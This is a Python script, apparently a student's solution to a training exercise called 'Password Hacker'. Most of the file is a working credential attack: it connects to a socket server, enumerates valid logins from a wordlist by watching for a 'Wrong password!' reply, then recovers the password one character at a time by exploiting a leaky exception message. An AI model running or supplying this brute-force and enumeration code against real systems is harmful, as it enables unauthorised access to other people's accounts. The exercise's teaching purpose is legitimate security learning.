"""The functionality for hacking credentials: login and/or password."""

import argparse
import itertools
import json
import socket
from string import ascii_letters, digits


class PasswordHacker:
    """The creation of the PasswordHacker object and related functionality."""
    
    chars = list(ascii_letters + digits)
    n_ph = 0

    def __init__(self, hostname, port):
        """The initializer of the class.
        
        Arguments:
        hostname -- string, IP or domain
        port -- integer
        """
        self.hostname = hostname
        self.port = port

    def __new__(cls, *args, **kwargs):
        if cls.n_ph == 0:
            cls.n_ph += 1
            return object.__new__(cls)
        return None

    def __repr__(self):
        return f'Password Hacker object with:\n' \
               f'IP ADDRESS: {self.hostname}\n' \
               f'PORT: {self.port}\n'

    def __str__(self):
        return self.__repr__()

    @staticmethod
    def chars_iterator():
        yield from itertools.cycle(PasswordHacker.chars)


    def vulnerability_brute_force(self, logins_file):
        """Algorithm used when the server sends guiding messages like 'wrong password'
        Uses json module to serialize sent and received messages"""
        with socket.socket() as client_socket:
            client_socket.connect((self.hostname, self.port))
            # find the login: save it in valid_login
            valid_login = ''
            with open(logins_file, 'r') as file:
                for line in file:
                    login = line.rstrip('\n')
                    json_auth = json.dumps({"login": login, "password": ' '})
                    client_socket.send(json_auth.encode())
                    response = json.loads(client_socket.recv(1024).decode())
                    if response['result'] == 'Wrong password!':
                        valid_login = login
                        break
            # find password
            password = ""
            try:
                for char in PasswordHacker.chars_iterator():
                    password_guess = password + char
                    json_auth = json.dumps({"login": valid_login, "password": password_guess})
                    client_socket.send(json_auth.encode())
                    response = json.loads(client_socket.recv(1024).decode())
                    if response["result"] == "Connection success!":
                        return json_auth
                    elif response["result"] == "Exception happened during login":
                        password = password_guess
            except StopIteration:
                return None


def args():
    """Get arguments from command line. Return parser object with attributes."""
    
    parser = argparse.ArgumentParser(description="This program receives 2 arguments \
     and tries to connect to address with generated password through a socket")
    parser.add_argument("IP", help="Type IP address like 127.0.0.1 ")
    parser.add_argument("port", default="9090",
                        help="Specify port like 9090")
    # parser.add_argument("message", help="Type message for sending")
    return parser.parse_args()


def main():
    file_name = r'C:\Users\Тоша\PycharmProjects\Password Hacker\Password Hacker\task\logins.txt'
    arguments = args()
    ip, port = arguments.IP, int(arguments.port)
    hacker_object = PasswordHacker(ip, port)
    result = hacker_object.vulnerability_brute_force(file_name)
    if result is None:
        print('-> Password not found <-')
    else:
        print(result)


if __name__ == '__main__':
    main()
